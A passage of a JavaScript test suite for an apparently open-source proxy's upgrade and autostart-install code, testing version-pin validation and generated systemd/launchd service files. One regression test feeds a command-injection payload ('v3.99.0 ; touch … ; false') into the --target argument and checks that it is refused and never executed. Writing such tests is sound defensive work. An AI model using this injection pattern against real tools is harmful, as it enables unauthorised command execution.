    target: "3.12.0",
    mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" },
                  current_version: "v3.10.0", latest_version: "v3.14.0" },
  });
  const fetchInstallCmds = result.phases.filter(p => p.name === "fetch+install").map(p => p.cmd);
  assert.ok(fetchInstallCmds.some(c => c.includes("checkout v3.12.0")),
    `expected the normalized 'v3.12.0', got cmds=${JSON.stringify(fetchInstallCmds)}`);
});

test("#257: a --target that is not a known release tag is refused BEFORE any mutation (no snapshot taken)", async () => {
  let caught = null;
  try {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      target: "v3.12.0", mockTargetExists: false,
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" },
                    current_version: "v3.10.0", latest_version: "v3.14.0" },
    });
  } catch (e) { caught = e; }
  assert.ok(caught, "must reject a --target that is not a known release tag");
  assert.ok(/not a known release tag/.test(caught.message), `expected an actionable message, got: ${caught.message}`);
  assert.equal(caught.snapshotPath, undefined,
    `must refuse BEFORE ever taking a snapshot (no partial mutation); got snapshotPath=${JSON.stringify(caught.snapshotPath)}`);
  assert.equal(caught.phases, undefined,
    `must refuse before phase bookkeeping even starts; got phases=${JSON.stringify(caught.phases)}`);
});

test("#257: a --target that IS a known release tag (mockTargetExists:true) proceeds normally", async () => {
  const result = await runUpgrade({
    yes: true, dryRun: false, mockExec: true,
    target: "v3.12.0", mockTargetExists: true,
    mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" },
                  current_version: "v3.10.0", latest_version: "v3.14.0" },
  });
  assert.equal(result.target, "v3.12.0");
});

test("#257: --target older than current_version is refused -- the full upgrade path only moves forward", async () => {
  let caught = null;
  try {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      target: "v3.9.0",
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" },
                    current_version: "v3.10.0", latest_version: "v3.14.0" },
    });
  } catch (e) { caught = e; }
  assert.ok(caught, "must reject a --target older than current_version");
  assert.ok(/not newer than the current version/.test(caught.message), `expected an actionable message, got: ${caught.message}`);
});

test("#257: --target equal to current_version is refused (not a forward upgrade)", async () => {
  let caught = null;
  try {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      target: "v3.10.0",
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" },
                    current_version: "v3.10.0", latest_version: "v3.14.0" },
    });
  } catch (e) { caught = e; }
  assert.ok(caught, "must reject a --target equal to current_version");
  assert.ok(/not newer than the current version/.test(caught.message), `expected an actionable message, got: ${caught.message}`);
});

test("#257: an unparseable --target is refused with a clear message rather than reaching git with a bad ref", async () => {
  let caught = null;
  try {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      target: "banana",
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" },
                    current_version: "v3.10.0", latest_version: "v3.14.0" },
    });
  } catch (e) { caught = e; }
  assert.ok(caught, "must reject an unparseable --target");
  assert.ok(/not a parseable/.test(caught.message), `expected an actionable message, got: ${caught.message}`);
});

// ── #257 SECURITY (independent review finding, HIGH) ────────────────────────────────────────────
// A shell-metacharacter --target payload used to be accepted by the OLD unanchored regex (it
// matched only a PREFIX of the string, silently discarding the rest), and the raw string --
// metacharacters included -- was then interpolated into an `execSync` template string, which
// runs through /bin/sh. The injected command executed DURING VALIDATION, before the tag was
// ultimately (and separately) refused -- so a test that only asserts "the pin was refused" would
// have passed against the vulnerable code; the refusal was never protection, it just happened to
// also occur. This test asserts BOTH: the pin is refused, AND the payload's injected command
// never ran (a marker file inside a disposable scratch directory -- never touching the real ~/ocp
// tree or any real credential -- must not exist afterward).
//
// mockExec:false is deliberate and required here: mockExec:true would skip the real git call
// entirely (tagExists defaults to true), which means the vulnerable shell-interpolation line
// would never even run under mockExec -- the vulnerability could only ever be demonstrated (or
// ruled out) with real execution. Safe to run for real: this specific payload's own trailing
// `; false` guarantees the compound shell command's exit status is non-zero, so validation
// refuses (throws) immediately after -- BEFORE runFullUpgrade's `try` block / phase 1 is ever
// reached -- meaning no snapshot, no npm install, no setup.mjs, no restart ever runs, regardless
// of whether the code being tested is the vulnerable version or the fixed one. `ocpDir` points at
// a throwaway temp directory created fresh for this test and removed in `finally` -- it does not
// need to be a real git repository (the injected command runs via the shell's `;` separator
// regardless of whether the preceding `git` invocation succeeds).
//
// Belt-and-braces note, verified directly (mutation-tested, not assumed): even if the
// tag-existence guard itself were ever neutered by a future regression, this specific test setup
// has a SECOND, independent safety net -- `ocpDir` is a plain empty directory, not a real git
// repository, so `runFullUpgrade`'s very next real command (phase 2's `git -C ${ocpDir}
// rev-parse HEAD`, to compute the snapshot's fromCommit) fails immediately with "not a git
// repository", aborting before `writeSnapshot()` -- which targets the REAL homedir(), not
// ocpDir -- is ever reached. Confirmed empirically: neutering the tag-existence throw and
// re-running this test does NOT create any file under the real ~/.ocp/upgrade-snapshot-*/.
test("#257 SECURITY: a --target shell-metacharacter payload is refused AND never reaches a shell (marker file must not exist)", async () => {
  const scratchDir = _ltMkdtemp(join(_ltTmp(), "ocp-257-injection-"));
  try {
    const markerPath = join(scratchDir, "PWNED");
    const payload = `v3.99.0 ; touch ${markerPath} ; false`;
    let caught = null;
    try {
      await runUpgrade({
        yes: true, dryRun: false, mockExec: false, ocpDir: scratchDir,
        target: payload,
        mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" },
                      current_version: "v3.10.0", latest_version: "v3.14.0" },
      });
    } catch (e) { caught = e; }
    assert.ok(caught, "a shell-metacharacter --target payload must be refused, not silently accepted");
    assert.ok(!_ltExists(markerPath),
      `SECURITY: the payload's injected command must NEVER execute -- a marker file at ` +
      `${markerPath} would prove --target reached a real shell. A refusal message alone does ` +
      `NOT prove this: the vulnerable code also refused this exact payload, AFTER the injected ` +
      `command had already run (verified independently before this fix).`);
  } finally {
    _ltRm(scratchDir, { recursive: true, force: true });
  }
});

// Isolates the ANCHORED-REGEX layer specifically (the OLD unanchored `/^(\d+)\.(\d+)\.(\d+)/`,
// with no trailing `$`, matched only a PREFIX and silently discarded everything after it). This
// is deliberately a DIFFERENT test from the SECURITY test above: a metacharacter payload is
// caught by rebuild-from-parts (below) even if the anchor alone regresses, so a test built
// around a metacharacter payload cannot, by itself, prove the anchor is doing anything. This
// payload carries no metacharacters at all -- just a valid vX.Y.Z prefix followed by ordinary
// trailing text -- so it isolates: does the validator REJECT malformed input, or does it
// silently truncate and accept a truthy-looking prefix?
test("#257: trailing garbage after a valid-looking vX.Y.Z prefix is refused, not silently truncated and accepted", async () => {
  let caught = null;
  try {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      target: "v3.12.0-drift-extra-text",
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" },
                    current_version: "v3.10.0", latest_version: "v3.14.0" },
    });
  } catch (e) { caught = e; }
  assert.ok(caught, "a --target with trailing garbage after a valid-looking prefix must be refused, not silently truncated and accepted as the prefix alone");
  assert.ok(/not a parseable/.test(caught.message), `expected an actionable message, got: ${caught.message}`);
});

// Isolates the REBUILD-FROM-PARSED-INTEGERS layer specifically. A leading zero is the cleanest
// input that distinguishes "return the raw string unchanged (only prefixing 'v' if missing)"
// (the pre-review-fix approach) from "rebuild v${major}.${minor}.${patch} from the PARSED
// integers" (this fix): both accept "v03.12.0" as parseable and both agree it's newer than
// v3.10.0, but only the rebuilt form produces the CANONICAL "v3.12.0" a real release tag would
// actually be named -- the raw/prefix-only form would silently carry "v03.12.0" through to
// `git checkout`/`rev-parse --verify refs/tags/v03.12.0`, which does not match any real tag
// (`v3.12.0`), on a real repository. This is a correctness property distinct from the injection
// fix above, but is exactly what the review's "return a NORMALIZED string" requirement covers.
test("#257: --target with a leading zero (v03.12.0) is normalized to the canonical v3.12.0, not passed through with the zero preserved", async () => {
  const result = await runUpgrade({
    yes: true, dryRun: false, mockExec: true,
    target: "v03.12.0",
    mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" },
                  current_version: "v3.10.0", latest_version: "v3.14.0" },
  });
  assert.equal(result.target, "v3.12.0", `expected the canonical, zero-stripped form; got ${JSON.stringify(result.target)}`);
  const fetchInstallCmds = result.phases.filter((p) => p.name === "fetch+install").map((p) => p.cmd);
  assert.ok(fetchInstallCmds.some((c) => c.includes("checkout v3.12.0")),
    `expected checkout of the CANONICAL v3.12.0, not the raw v03.12.0; got cmds=${JSON.stringify(fetchInstallCmds)}`);
  assert.ok(!fetchInstallCmds.some((c) => c.includes("v03.12.0")),
    `must not carry the raw, non-canonical 'v03.12.0' through to git; got cmds=${JSON.stringify(fetchInstallCmds)}`);
});

test("#257: --dry-run preview for the full path shows the PINNED target, not doctor.latest_version", async () => {
  const result = await runUpgrade({
    dryRun: true, target: "v3.12.0",
    mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" },
                  current_version: "v3.10.0", latest_version: "v3.14.0" },
  });
  assert.ok(result.plan.some((l) => l.includes("checkout v3.12.0")), `expected preview to show the pinned target; plan=${JSON.stringify(result.plan)}`);
  assert.ok(!result.plan.some((l) => l.includes("checkout v3.14.0")), `preview must not show latest_version when --target pins elsewhere; plan=${JSON.stringify(result.plan)}`);
});

test("#257 control: --dry-run preview without --target still shows doctor.latest_version (unchanged default)", async () => {
  const result = await runUpgrade({
    dryRun: true,
    mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" },
                  current_version: "v3.10.0", latest_version: "v3.14.0" },
  });
  assert.ok(result.plan.some((l) => l.includes("checkout v3.14.0")), `expected the unchanged default preview; plan=${JSON.stringify(result.plan)}`);
});

test("#257: --dry-run with an invalid --target still throws (dry-run skips MUTATION, not validation)", async () => {
  await assert.rejects(async () => {
    await runUpgrade({
      dryRun: true, target: "v3.9.0",
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" },
                    current_version: "v3.10.0", latest_version: "v3.14.0" },
    });
  }, /not newer than the current version/);
});

// ── Reconfigure-only service mode (#226) ──────────────────────────────────
// #215: on a host where a competing systemd/launchd unit already owns the OCP port, an
// upgrade's reconfigure step (setup.mjs) must not enable-at-boot or start the service it
// writes config for — that races/duplicates whatever phase 5 (restart) resolves to run, and
// re-arms the boot race #215 describes. #221 (merged) fixes phase 5's target resolution ON
// LINUX — phase 5 no longer hard-codes a restart target, it resolves the unit that actually
// owns the port from live process/cgroup state; this section covers the layering fix so
// phase 4 stops performing phase 5's job in the first place. Together the two close the #215
// orphan for this (cross-minor upgrade) path — on Linux. ON MACOS, phase 5's resolution (its
// lsof/netstat cross-check, #240) now correctly tells a genuinely empty port apart from an
// ambiguous one — but even a CONFIRMED listener is still restarted over without verifying
// it's actually the `dev.ocp.proxy` job (open: #239). The same #215 defect shape also
// persists, on both platforms, on the separate bash `cmd_restart` cascade used by the
// patch-bump ("update") and plain-restart ("restart") kinds — tracked separately as #224,
// not touched by either fix.
//
// planServiceActions() / resolveServicePlan() are imported directly (not replicated, unlike
// the setup.mjs inject helpers above) because scripts/lib/service-mode.mjs is a real
// side-effect-free module — setup.mjs itself still cannot be imported, but the decision
// (including the --reconfigure-only argv parse itself, per resolveServicePlan) was
// deliberately extracted out of it into something that can be.
import { planServiceActions, resolveServicePlan } from "./scripts/lib/service-mode.mjs";

console.log("\nReconfigure-only service mode (#226):");

test("planServiceActions(linux) default: daemon-reload + enable + start (first-install behavior)", () => {
  const actions = planServiceActions("linux");
  assert.deepEqual(actions, { daemonReload: true, enable: true, start: true });
});

test("planServiceActions(linux, reconfigureOnly): daemon-reload stays true, enable+start become false", () => {
  const actions = planServiceActions("linux", { reconfigureOnly: true });
  assert.deepEqual(actions, { daemonReload: true, enable: false, start: false });
});

test("planServiceActions(darwin) default: bootstrap true (first-install behavior)", () => {
  const actions = planServiceActions("darwin");
  assert.deepEqual(actions, { bootstrap: true });
});

test("planServiceActions(darwin, reconfigureOnly): bootstrap false (plist written, not loaded)", () => {
  const actions = planServiceActions("darwin", { reconfigureOnly: true });
  assert.deepEqual(actions, { bootstrap: false });
});

test("planServiceActions on an unsupported platform returns {} regardless of reconfigureOnly", () => {
  assert.deepEqual(planServiceActions("win32"), {});
  assert.deepEqual(planServiceActions("win32", { reconfigureOnly: true }), {});
});

test("planServiceActions(platform, null) does not throw (review-flagged robustness gap)", () => {
  assert.doesNotThrow(() => planServiceActions("linux", null));
  assert.deepEqual(planServiceActions("linux", null), { daemonReload: true, enable: true, start: true });
});

// ── resolveServicePlan: the argv-parse-to-decision seam (review finding H2 / MX1) ──────────
// Closes the gap where the --reconfigure-only argv parse lived as an untestable setup.mjs
// top-level const, separate from the tested planServiceActions() decision — a mutation to
// that const (e.g. hardcoding it to `false`) previously left the full suite green.
test("resolveServicePlan([], 'linux'): reconfigureOnly false, full enable+start plan", () => {
  const plan = resolveServicePlan([], "linux");
  assert.deepEqual(plan, { reconfigureOnly: false, daemonReload: true, enable: true, start: true });
});

test("resolveServicePlan(['--reconfigure-only'], 'linux'): reconfigureOnly true, enable+start false", () => {
  const plan = resolveServicePlan(["--reconfigure-only"], "linux");
  assert.deepEqual(plan, { reconfigureOnly: true, daemonReload: true, enable: false, start: false });
});

test("resolveServicePlan([], 'darwin'): reconfigureOnly false, bootstrap true", () => {
  const plan = resolveServicePlan([], "darwin");
  assert.deepEqual(plan, { reconfigureOnly: false, bootstrap: true });
});

test("resolveServicePlan(['--reconfigure-only'], 'darwin'): reconfigureOnly true, bootstrap false", () => {
  const plan = resolveServicePlan(["--reconfigure-only"], "darwin");
  assert.deepEqual(plan, { reconfigureOnly: true, bootstrap: false });
});

test("resolveServicePlan refuses --reconfigure-only=true rather than silently parsing as false (fails-open guard)", () => {
  assert.throws(() => resolveServicePlan(["--reconfigure-only=true"], "linux"), /takes no value/);
});

test("resolveServicePlan refuses --reconfigure-only=false rather than silently parsing as false", () => {
  assert.throws(() => resolveServicePlan(["--reconfigure-only=false"], "linux"), /takes no value/);
});

test("resolveServicePlan tolerates other unrelated argv alongside the bare flag", () => {
  const plan = resolveServicePlan(["--port", "3456", "--reconfigure-only", "--bind", "0.0.0.0"], "linux");
  assert.equal(plan.reconfigureOnly, true);
});

// ── installAutoStart: behavioral tests (review round 2 — replaces source-shape assertions) ──
// Round 1 of this review response added source-text regex assertions here, on the premise
// that setup.mjs's top-level side effects make it unimportable/unexecutable. The premise was
// real; the fix was wrong. AGENTS.md's "Testing discipline: what counts as a test" section
// (general — it covers ocp-connect and bash `cmd_restart`, NOT scoped to server.mjs the way
// the OTHER testing section is) says exactly why: a source-text assertion "passes when the
// code is deleted and re-added wrong, and breaks on reformatting." Both failure modes were
// demonstrated against the actual PR: a reviewer mutation emptied the H1 gate
// (`if (!servicePlan.reconfigureOnly) { }`) while leaving the migration code in an adjacent,
// now-unguarded block — the landmark-bounded regex found every string it searched for
// (co-location, not containment) and the suite stayed green. Fix: the imperative Step 7 body
// moved into scripts/lib/install-autostart.mjs's installAutoStart(), an injectable function —
// the same seam scripts/upgrade.mjs already uses (opts.mockExec) and doctor.mjs uses
// (opts.mockHealth). These tests call the REAL function with fake run/fs primitives and
// assert on which commands/files were actually touched, not on source shape.
import { installAutoStart, xmlEscape } from "./scripts/lib/install-autostart.mjs";

function baseInstallOpts(overrides = {}) {
  return {
    platform: "linux",
    servicePlan: resolveServicePlan([], "linux"),
    paths: {
      HOME: "/fake/home",
      OPENCLAW_DIR: "/fake/home/.openclaw",
      serverPath: "/fake/repo/server.mjs",
      startPath: "/fake/repo/start.sh",
    },
    config: {
      PORT: 3456, BIND_ADDRESS: "127.0.0.1", AUTH_MODE_CONFIG: "none",
      CLAUDE_BIN_INJECT: null, OCP_ADMIN_KEY_INJECT: null, PROXY_ANON_KEY_INJECT: null,
    },
    run: () => "",
    writeFile: () => {},
    readFile: () => "",
    existsPath: () => false,
    makeDir: () => {},
    chmodPath: () => {},
    unlinkPath: () => {},
    log: () => {},
    warn: () => {},
    print: () => {},
    ...overrides,
  };
}

console.log("\ninstallAutoStart (behavioral, review round 2):");

test("installAutoStart(linux, reconfigureOnly): run gets daemon-reload but never enable or start", () => {
  const calls = [];
  installAutoStart(baseInstallOpts({
    servicePlan: resolveServicePlan(["--reconfigure-only"], "linux"),
    run: (cmd) => { calls.push(cmd); return ""; },
  }));
  assert.ok(calls.some(c => c.includes("daemon-reload")), `expected a daemon-reload call; got ${JSON.stringify(calls)}`);
  assert.ok(!calls.some(c => c.includes("enable ocp-proxy")), `enable must never run under --reconfigure-only; calls=${JSON.stringify(calls)}`);
  assert.ok(!calls.some(c => c.includes("start ocp-proxy")), `start must never run under --reconfigure-only; calls=${JSON.stringify(calls)}`);
});

test("installAutoStart(linux, first install): run gets daemon-reload, enable, AND start (positive-path control)", () => {
  const calls = [];
  installAutoStart(baseInstallOpts({
    servicePlan: resolveServicePlan([], "linux"),
    run: (cmd) => { calls.push(cmd); return ""; },
  }));
  assert.ok(calls.some(c => c.includes("daemon-reload")));
  assert.ok(calls.some(c => c.includes("enable ocp-proxy")), `expected enable on a first install; calls=${JSON.stringify(calls)}`);
  assert.ok(calls.some(c => c.includes("start ocp-proxy")), `expected start on a first install; calls=${JSON.stringify(calls)}`);
});

test("installAutoStart(darwin, reconfigureOnly): run never receives bootstrap or bootout for the new plist", () => {
  const calls = [];
  installAutoStart(baseInstallOpts({
    platform: "darwin",
    servicePlan: resolveServicePlan(["--reconfigure-only"], "darwin"),
    run: (cmd) => { calls.push(cmd); return ""; },
  }));
  assert.ok(!calls.some(c => c.includes("bootstrap")), `bootstrap must never run under --reconfigure-only; calls=${JSON.stringify(calls)}`);
  assert.ok(!calls.some(c => c.includes("bootout")), `bootout for the new plist must never run under --reconfigure-only; calls=${JSON.stringify(calls)}`);
});

test("installAutoStart(darwin, first install): run gets bootout then bootstrap (positive-path control)", () => {
  const calls = [];
  installAutoStart(baseInstallOpts({
    platform: "darwin",
    servicePlan: resolveServicePlan([], "darwin"),
    run: (cmd) => { calls.push(cmd); return ""; },
  }));
  assert.ok(calls.some(c => c.includes("bootout")), `expected bootout on a first install; calls=${JSON.stringify(calls)}`);
  assert.ok(calls.some(c => c.includes("bootstrap")), `expected bootstrap on a first install; calls=${JSON.stringify(calls)}`);
});

// ── H1, proven behaviorally: legacy-unit migration must not run under --reconfigure-only ──
// This is the exact scenario the review's "empty gate" mutation targeted: a host with a
// legacy plist/service present, running --reconfigure-only. Unlike the deleted source
// assertion, this calls the real installAutoStart() and observes real (faked) run/unlink
// calls — a mutation that empties the gate, or moves the migration code outside it, makes
// these calls actually happen, which these tests actually catch.
test("installAutoStart(darwin, reconfigureOnly, legacy plist present): legacy bootout/unlink never happen (H1)", () => {
  const legacyPath = "/fake/home/Library/LaunchAgents/ai.openclaw.proxy.plist";
  const calls = [];
  const unlinked = [];
  installAutoStart(baseInstallOpts({
    platform: "darwin",
    servicePlan: resolveServicePlan(["--reconfigure-only"], "darwin"),
    existsPath: (p) => p === legacyPath, // only the legacy plist "exists"; the new one is a fresh write
    run: (cmd) => { calls.push(cmd); return ""; },
    unlinkPath: (p) => { unlinked.push(p); },
  }));
  assert.ok(!calls.some(c => c.includes("ai.openclaw.proxy")), `legacy bootout must never run under --reconfigure-only; calls=${JSON.stringify(calls)}`);
  assert.ok(!unlinked.includes(legacyPath), `legacy plist must never be unlinked under --reconfigure-only; unlinked=${JSON.stringify(unlinked)}`);
});

test("installAutoStart(darwin, first install, legacy plist present): legacy IS migrated away (positive-path control)", () => {
  const legacyPath = "/fake/home/Library/LaunchAgents/ai.openclaw.proxy.plist";
  const calls = [];
  const unlinked = [];
  installAutoStart(baseInstallOpts({
    platform: "darwin",
    servicePlan: resolveServicePlan([], "darwin"),
    existsPath: (p) => p === legacyPath,
    run: (cmd) => { calls.push(cmd); return ""; },
    unlinkPath: (p) => { unlinked.push(p); },
  }));
  assert.ok(calls.some(c => c.includes("ai.openclaw.proxy")), "legacy bootout must run on a bare install with a legacy plist present");
  assert.ok(unlinked.includes(legacyPath), "legacy plist must be unlinked on a bare install");
});

test("installAutoStart(linux, reconfigureOnly, legacy service present): stop/disable/unlink never happen; daemon-reload runs exactly once (H1)", () => {
  const legacyPath = "/fake/home/.config/systemd/user/openclaw-proxy.service";
  const calls = [];
  const unlinked = [];
  installAutoStart(baseInstallOpts({
    platform: "linux",
    servicePlan: resolveServicePlan(["--reconfigure-only"], "linux"),
    existsPath: (p) => p === legacyPath,
    run: (cmd) => { calls.push(cmd); return ""; },
    unlinkPath: (p) => { unlinked.push(p); },
  }));
  assert.ok(!calls.some(c => c.includes("stop openclaw-proxy")), `legacy stop must never run under --reconfigure-only; calls=${JSON.stringify(calls)}`);
  assert.ok(!calls.some(c => c.includes("disable openclaw-proxy")), `legacy disable must never run under --reconfigure-only; calls=${JSON.stringify(calls)}`);
  assert.ok(!unlinked.includes(legacyPath), `legacy service file must never be unlinked under --reconfigure-only; unlinked=${JSON.stringify(unlinked)}`);
  const daemonReloadCount = calls.filter(c => c.includes("daemon-reload")).length;
  assert.equal(daemonReloadCount, 1,
    `expected exactly one daemon-reload (main write path only, not a second one from legacy migration) — got ${daemonReloadCount}: ${JSON.stringify(calls)}`);
});

test("installAutoStart(linux, first install, legacy service present): stop/disable/unlink DO happen (positive-path control)", () => {
  const legacyPath = "/fake/home/.config/systemd/user/openclaw-proxy.service";
  const calls = [];
  const unlinked = [];
  installAutoStart(baseInstallOpts({
    platform: "linux",
    servicePlan: resolveServicePlan([], "linux"),
    existsPath: (p) => p === legacyPath,
    run: (cmd) => { calls.push(cmd); return ""; },
    unlinkPath: (p) => { unlinked.push(p); },
  }));
  assert.ok(calls.some(c => c.includes("stop openclaw-proxy")), "legacy stop must run on a bare install with a legacy service present");
  assert.ok(calls.some(c => c.includes("disable openclaw-proxy")), "legacy disable must run on a bare install with a legacy service present");
  assert.ok(unlinked.includes(legacyPath), "legacy service file must be unlinked on a bare install");
});

test("installAutoStart(unsupported platform): no run/write/unlink calls at all, regardless of reconfigureOnly", () => {
  const calls = [];
  const unlinked = [];
  const written = [];
  installAutoStart(baseInstallOpts({
    platform: "win32",
    servicePlan: resolveServicePlan(["--reconfigure-only"], "win32"),
    run: (cmd) => { calls.push(cmd); return ""; },
    unlinkPath: (p) => { unlinked.push(p); },
    writeFile: (p) => { written.push(p); },
  }));
  assert.equal(calls.length, 0);
  assert.equal(unlinked.length, 0);
  assert.equal(written.length, 0);
});

// ── #231: content/order guards on the generated template (not run()-call membership) ──
// Everything above this point asserts which run()/unlink calls happened, or that a path was
// touched — never the CONTENT of what installAutoStart actually writes, nor the ORDER commands
// run in. Issue #231 (found in review of #229) demonstrated six template properties that are
// load-bearing on a real host but pass this whole file's suite unchanged when mutated: a
// WantedBy= target swap, RunAtLoad flipped to false, a dropped chmod 0600, daemon-reload moved
// after enable/start, Restart=always flipped to Restart=no, and the env-merge branch bypassed —
// all six survived at 510 passed/0 failed in the issue's own mutation table, because
// baseInstallOpts()'s `existsPath: () => false` default means the env-merge branch is never even
// exercised, and no prior test reads a captured writeFile/chmodPath argument. These tests do.
console.log("\ninstallAutoStart template guards (#231 — assert on generated content/order):");

test("G1: linux systemd unit's [Install] section targets default.target, not graphical-session.target", () => {
  let unitContent = null;
  installAutoStart(baseInstallOpts({
    platform: "linux",
    writeFile: (path, content) => { if (path.endsWith("ocp-proxy.service")) unitContent = content; },
  }));
  assert.ok(unitContent, "expected the systemd unit file to be written");
  assert.match(unitContent, /^WantedBy=default\.target$/m,
    `expected an exact "WantedBy=default.target" line; got:\n${unitContent}`);
});

test("G2: darwin plist's RunAtLoad is literally <true/> (job must actually start at login)", () => {
  let plistContent = null;
  installAutoStart(baseInstallOpts({
    platform: "darwin",
    servicePlan: resolveServicePlan([], "darwin"),
    writeFile: (path, content) => { if (path.endsWith("dev.ocp.proxy.plist")) plistContent = content; },
  }));
  assert.ok(plistContent, "expected the plist to be written");
  const m = plistContent.match(/<key>RunAtLoad<\/key>\s*<(true|false)\/>/);
  assert.ok(m, `expected a RunAtLoad key/value pair; got:\n${plistContent}`);
  assert.equal(m[1], "true", `RunAtLoad must be <true/>; got <${m[1]}/>`);
});

test("G3a: darwin plist file is chmod'd 0600 (carries OCP_ADMIN_KEY/PROXY_ANONYMOUS_KEY — CHANGELOG:457)", () => {
  const chmods = [];
  installAutoStart(baseInstallOpts({
    platform: "darwin",
    servicePlan: resolveServicePlan([], "darwin"),
    chmodPath: (path, mode) => { chmods.push({ path, mode }); },
  }));
  const plistChmod = chmods.find(c => c.path.endsWith("dev.ocp.proxy.plist"));
  assert.ok(plistChmod, `expected a chmodPath call on the plist; got=${JSON.stringify(chmods)}`);
  assert.equal(plistChmod.mode, 0o600, `plist must be chmod 0600; got ${String(plistChmod.mode)}`);
});

test("G3b: linux systemd unit file is chmod'd 0600 (carries OCP_ADMIN_KEY/PROXY_ANONYMOUS_KEY — CHANGELOG:457)", () => {
  const chmods = [];
  installAutoStart(baseInstallOpts({
    platform: "linux",
    chmodPath: (path, mode) => { chmods.push({ path, mode }); },
  }));
  const unitChmod = chmods.find(c => c.path.endsWith("ocp-proxy.service"));
  assert.ok(unitChmod, `expected a chmodPath call on the unit file; got=${JSON.stringify(chmods)}`);
  assert.equal(unitChmod.mode, 0o600, `unit file must be chmod 0600; got ${String(unitChmod.mode)}`);
});

test("G4: linux first-install run() order is daemon-reload BEFORE enable BEFORE start (#221 MED-8: stale-cache restart)", () => {
  const calls = [];
  installAutoStart(baseInstallOpts({
    platform: "linux",
    servicePlan: resolveServicePlan([], "linux"),
    run: (cmd) => { calls.push(cmd); return ""; },
  }));
  const relevant = calls.filter(c => /daemon-reload|enable ocp-proxy|start ocp-proxy/.test(c));
  assert.deepEqual(relevant, [
    "systemctl --user daemon-reload",
    "systemctl --user enable ocp-proxy",
    "systemctl --user start ocp-proxy",
  ], `expected exactly this order (membership alone does not prove ordering); got ${JSON.stringify(relevant)}`);
});

test("G5: linux systemd unit has Restart=always, not Restart=no", () => {
  let unitContent = null;
  installAutoStart(baseInstallOpts({
    platform: "linux",
    writeFile: (path, content) => { if (path.endsWith("ocp-proxy.service")) unitContent = content; },
  }));
  assert.ok(unitContent, "expected the systemd unit file to be written");
  assert.match(unitContent, /^Restart=always$/m, `expected "Restart=always"; got:\n${unitContent}`);
});

test("G6: linux mergeSystemdEnv actually runs — a pre-existing operator env var survives the rewrite", () => {
  // baseInstallOpts()'s existsPath: () => false means this branch (existsPath(path) ?
  // readFile(...) : null) is never exercised by any test above — closing G6 means exercising
  // it, not just asserting on mergeSystemdEnv in isolation (already covered at the unit level
  // around test-features.mjs:649-653; this is the WIRING, which was never proven).
  const servicePath = "/fake/home/.config/systemd/user/ocp-proxy.service";
  const existingUnit = `[Unit]
Description=OCP — Open Claude Proxy
After=network.target

[Service]
ExecStart=/usr/bin/node /fake/repo/server.mjs
Environment=CLAUDE_PROXY_PORT=3456
Environment=CLAUDE_BIND=127.0.0.1
Environment=CLAUDE_AUTH_MODE=none
Environment=CUSTOM_OPERATOR_VAR=keep-me
Restart=always
RestartSec=5
`;
  let finalContent = null;
  installAutoStart(baseInstallOpts({
    platform: "linux",
    existsPath: (p) => p === servicePath,
    readFile: (p) => (p === servicePath ? existingUnit : ""),
    writeFile: (path, content) => { if (path === servicePath) finalContent = content; },
  }));
  assert.ok(finalContent, "expected the systemd unit file to be (re)written");
  assert.match(finalContent, /Environment=CUSTOM_OPERATOR_VAR=keep-me/,
    `expected the pre-existing operator env var to survive the rewrite; got:\n${finalContent}`);
});

// ── G7 (added — not in the issue's list; same defect class as G6, other platform) ──
// The exact same existsPath: () => false blind spot leaves darwin's mergePlistEnv branch
// (installAutoStart's plist counterpart to G6's mergeSystemdEnv) equally unexercised. It's the
// identical wiring gap on the platform this dev host actually runs under, so it's covered here
// too rather than left as a known gap.
test("G7: darwin mergePlistEnv actually runs — a pre-existing operator env var survives the rewrite", () => {
  const plistPath = "/fake/home/Library/LaunchAgents/dev.ocp.proxy.plist";
  const existingPlist = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>dev.ocp.proxy</string>
  <key>EnvironmentVariables</key>
  <dict>
    <key>CLAUDE_PROXY_PORT</key>
    <string>3456</string>
    <key>CLAUDE_BIND</key>
    <string>127.0.0.1</string>
    <key>CLAUDE_AUTH_MODE</key>
    <string>none</string>
    <key>CUSTOM_OPERATOR_VAR</key>
    <string>keep-me</string>
  </dict>
</dict>
</plist>`;
  let finalContent = null;
  installAutoStart(baseInstallOpts({
    platform: "darwin",
    servicePlan: resolveServicePlan([], "darwin"),
    existsPath: (p) => p === plistPath,
    readFile: (p) => (p === plistPath ? existingPlist : ""),
    writeFile: (path, content) => { if (path === plistPath) finalContent = content; },
  }));
  assert.ok(finalContent, "expected the plist to be (re)written");
  assert.match(finalContent, /<key>CUSTOM_OPERATOR_VAR<\/key>\s*<string>keep-me<\/string>/,
    `expected the pre-existing operator env var to survive the rewrite; got:\n${finalContent}`);
});

// ── G8-G10 (added — independent review of this PR found these while verifying G1-G7) ──
// A fresh-context reviewer applied the same "is this actually load-bearing and actually
// unguarded" test G1-G7 used to every other property in the template and found two more real
// survivors before approving. Both close the same class of gap #231 described, just on
// properties #231's own list happened not to name.
test("G8: darwin plist's KeepAlive is literally <true/> (job must respawn after a crash, not die permanently)", () => {
  // Same defect class as G5 (Restart=always) — G5's own linux property, mapped onto darwin's
  // launchd equivalent. A mutation flipping this to <false/> survived the full suite (650/0)
  // until this test was added: nothing previously read KeepAlive out of the written plist.
  let plistContent = null;
  installAutoStart(baseInstallOpts({
    platform: "darwin",
    servicePlan: resolveServicePlan([], "darwin"),
